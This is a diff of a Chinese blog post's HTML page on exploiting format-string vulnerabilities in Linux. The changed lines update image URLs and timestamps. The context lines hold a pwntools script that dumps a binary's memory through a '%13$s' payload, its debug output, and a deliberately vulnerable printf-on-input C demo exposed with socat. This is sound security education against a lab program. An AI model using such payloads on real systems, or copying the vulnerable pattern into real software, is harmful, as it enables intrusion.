@@ -22,12 +22,12 @@
 <meta property="og:url" content="http://0x48.pw/2017/03/13/0x2c/index.html">
 <meta property="og:site_name" content="Hc1m1">
 <meta property="og:description" content="格式化字符串漏洞现在网上有很多相关的文章，原理啥的随便搜搜都是，这篇文章就对格式化字符串漏洞如何利用进行研究">
-<meta property="og:image" content="http://0x48.pw/img/format1.png">
-<meta property="og:updated_time" content="2018-02-09T04:18:58.713Z">
+<meta property="og:image" content="https://hcamael.oss-cn-beijing.aliyuncs.com/img/format1.png">
+<meta property="og:updated_time" content="2018-04-02T11:10:22.922Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux系统下格式化字符串利用研究">
 <meta name="twitter:description" content="格式化字符串漏洞现在网上有很多相关的文章，原理啥的随便搜搜都是，这篇文章就对格式化字符串漏洞如何利用进行研究">
-<meta name="twitter:image" content="http://0x48.pw/img/format1.png">
+<meta name="twitter:image" content="https://hcamael.oss-cn-beijing.aliyuncs.com/img/format1.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -372,7 +372,7 @@
 <p>可以成功dump数据了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python fmt_test.py</div><div class="line">[+] Starting local process &apos;./a.out&apos; argv=[&apos;a.out&apos;] : Done</div><div class="line">[DEBUG] Sent 0xc bytes:</div><div class="line">    00000000  25 31 33 24  73 61 61 61  00 80 04 08               │%13$│saaa│····││</div><div class="line">    0000000c</div><div class="line">[DEBUG] Received 0xa bytes:</div><div class="line">    00000000  7f 45 4c 46  01 01 01 61  61 61                     │·ELF│···a│aa│</div><div class="line">    0000000a</div></pre></td></tr></table></figure></p>
 <p>原理都懂了，可以写payload去dump 整个bin回来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#! /usr/bin/env python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line"></div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line">f = open(&quot;source.bin&quot;, &quot;ab+&quot;)</div><div class="line"></div><div class="line">begin = 0x8048000</div><div class="line">offset = 0</div><div class="line"></div><div class="line">while True:</div><div class="line">	addr = begin + offset</div><div class="line">	p = process(&quot;a.out&quot;)</div><div class="line">	p.sendline(&quot;%13$saaa&quot; + p32(addr))</div><div class="line">	try:</div><div class="line">		info = p.recvuntil(&quot;aaa&quot;)[:-3]</div><div class="line">	except EOFError:</div><div class="line">		print offset</div><div class="line">		break</div><div class="line">	info += &quot;\x00&quot;</div><div class="line">	p.close()</div><div class="line">	offset += len(info)</div><div class="line">	f.write(info)</div><div class="line">	f.flush()</div><div class="line"></div><div class="line">f.close()</div></pre></td></tr></table></figure></p>
 <p>内存数据dump下来后，虽然跟原始bin有很大不同，也运行不了，但是丢到ida中任然是可以看的:</p>
-<p><img src="/img/format1.png" alt="format1"></p>
+<p><img src="https://hcamael.oss-cn-beijing.aliyuncs.com/img/format1.png" alt="format1"></p>
 <h1 id="Write"><a href="#Write" class="headerlink" title="Write"></a>Write</h1><p>二进制漏洞的最终目的都是要getshell，所以在我们获取到bin后，接下来就是要getshell了</p>
 <p>不过之前的demo过于简单，没有什么好的getshell的方法，对demo进行下修改.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"># fmt_test2.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;</div><div class="line">	char a[1024];</div><div class="line">	while(1)</div><div class="line">	&#123;</div><div class="line">		memset(a, &apos;\0&apos;, 1024);</div><div class="line">		read(0, a, 1024);</div><div class="line">		printf(a);</div><div class="line">		fflush(stdout);</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"># $ gcc fmt_test2.c -o fmt_test2 -m32</div><div class="line"># $ socat TCP4-LISTEN:10001,fork EXEC:./fmt_test2</div></pre></td></tr></table></figure></p>
 <p>和之前的demo比，多了循环，不像之前一样一下就退出了</p>
@@ -409,7 +409,7 @@
         <p><span>本文标题:</span><a href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
         <p><span>发布时间:</span>2017-03-13, 15:39:33</p>
-        <p><span>最后更新:</span>2018-02-09, 12:18:58</p>
+        <p><span>最后更新:</span>2018-04-02, 19:10:22</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2017/03/13/0x2c/" title="Linux系统下格式化字符串利用研究">http://0x48.pw/2017/03/13/0x2c/</a>
             <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2017/03/13/0x2c/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
